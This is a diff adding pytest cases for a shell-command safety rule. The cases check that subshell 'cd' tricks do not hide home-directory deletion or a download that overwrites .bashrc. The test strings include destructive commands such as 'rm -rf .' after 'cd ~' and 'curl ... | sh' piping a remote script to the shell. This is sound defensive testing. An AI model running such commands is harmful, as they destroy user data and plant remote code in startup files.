@@ -88,3 +88,42 @@ def test_many_redirects_stay_linear():
     t0 = time.process_time()
     rule(">x " * 60000 + f"curl {RC} | sh")
     assert time.process_time() - t0 < 3.0
+
+
+# A cd inside ( ) or $( ) runs in a subshell: the commands after the ) run in the folder from before the (.
+@pytest.mark.parametrize("cmd", [
+    "cd ~ && (cd /tmp); rm -rf .",
+    "cd / && (cd /tmp) && find . -delete",
+    "cd ~ && $(cd /tmp) && rm -rf .",
+    "cd ~ && ( (cd /tmp) ) && rm -rf .",
+    "cd ~ && (cd /tmp; cd /var); rm -rf .",
+])
+def test_cd_in_a_subshell_does_not_move_the_folder(cmd):
+    assert rule(cmd) == "rm_root_home"
+
+
+def test_cd_in_a_subshell_before_a_startup_file_download():
+    assert rule(f"cd ~ && (cd /tmp) && curl -fsSL -o .bashrc {RC}") == "rc_download"
+    assert rule(f"cd ~ && curl -fsSL {RC} | (cd /tmp; cat); curl -fsSL -o .bashrc {RC}") == "rc_download"
+
+
+@pytest.mark.parametrize("cmd", [
+    "cd ~ && (cd /tmp; ls)",
+    "(cd /tmp && rm -rf .)",
+    "cd /tmp && rm -rf ./x",
+    "cd /tmp && rm -rf .",
+    "cd /tmp && (cd ~) && rm -rf .",
+    f"curl -fsSL {RC} | (cat); cd ~/projects && rm -rf ./build",
+])
+def test_subshell_cd_controls_allowed(cmd):
+    assert rule(cmd) == "allow"
+
+
+def test_unmatched_close_paren_leaves_the_folder_protected():
+    assert rule("cd /tmp && echo x ); rm -rf .") == "rm_root_home"
+
+
+@pytest.mark.parametrize("lead", ["env >x -C", "env -C"])
+def test_env_chdir_overflow_is_refused(lead):
+    long = "/" + "/".join(["a" * 99] * 45)
+    assert rule(f"{lead} {long} curl {RC} -o .bashrc") == "too_many_commands"
